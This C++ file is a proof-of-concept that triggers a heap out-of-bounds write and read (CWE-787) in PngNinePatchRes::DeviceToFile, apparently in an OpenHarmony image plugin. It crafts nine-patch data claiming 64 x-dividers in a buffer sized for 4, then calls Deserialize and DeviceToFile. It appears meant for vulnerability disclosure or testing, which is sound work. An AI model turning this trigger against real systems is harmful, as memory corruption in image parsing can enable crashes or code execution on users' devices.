/*
 * PoC: Heap Buffer Overflow in PngNinePatchRes::DeviceToFile
 * CWE-787: Out-of-bounds Write (and Read)
 *
 * Target-Compile: Links real png_ninepatch_res.cpp
 * Trigger: Deserialize() with crafted numXDivs → DeviceToFile()
 */

#include <cstdlib>
#include <cstring>
#include <cstdio>

#include "png_ninepatch_res.h"

using namespace OHOS::ImagePlugin;

int main() {
    // Allocate buffer: sizeof(PngNinePatchRes) + 4 int32_t dividers = 48 bytes
    // But set numXDivs=64, causing DeviceToFile to access 64 elements
    size_t alloc_size = sizeof(PngNinePatchRes) + 4 * sizeof(int32_t);
    printf("[*] PoC: PngNinePatchRes::DeviceToFile OOB (CWE-787)\n");
    printf("[*] Allocating %zu bytes (struct + 4 dividers)\n", alloc_size);
    printf("[*] Setting numXDivs=64, will access 64*4=256 bytes past struct\n");

    uint8_t *buffer = (uint8_t *)malloc(alloc_size);
    if (!buffer) return 1;
    memset(buffer, 0, alloc_size);

    // Craft malicious 9-patch data
    PngNinePatchRes *patch = reinterpret_cast<PngNinePatchRes *>(buffer);
    patch->numXDivs = 64;   // Claims 64 x-dividers, buffer only has space for 4
    patch->numYDivs = 0;
    patch->numColors = 0;

    // Fill the valid 4 divs
    int32_t *divs = reinterpret_cast<int32_t *>(buffer + sizeof(PngNinePatchRes));
    for (int i = 0; i < 4; i++) {
        divs[i] = 0x01020304;
    }

    // Deserialize sets up offsets (xDivsOffset, yDivsOffset, colorsOffset)
    PngNinePatchRes *result = PngNinePatchRes::Deserialize(buffer);

    // Trigger: DeviceToFile iterates numXDivs=64 times over 4-element array
    result->DeviceToFile();

    printf("[!] If you see this without ASan report, the overflow was silent\n");

    free(buffer);
    return 0;
}
